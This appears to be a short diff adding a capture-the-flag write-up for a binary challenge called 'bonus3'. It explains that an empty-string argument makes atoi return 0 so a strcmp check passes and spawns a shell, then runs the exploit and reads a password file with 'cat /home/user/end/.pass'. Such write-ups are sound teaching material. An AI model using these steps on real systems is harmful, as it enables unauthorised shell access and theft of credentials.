@@ -1,0 +1,9 @@
+# If we input "" as 'argv[1]', 'data.flag[atoi(argv[1])] = 0' will be 'data.flag[0] = 0'
+# 'data.flag' will thus be an empty string, and so is 'argv[1]'
+# The 'strcmp' will give '0', and we will have a reverse shell
+
+# We run our exploit
+./bonus3 ""
+
+# We use the reverse shell to retrieve the password
+$ cat /home/user/end/.pass
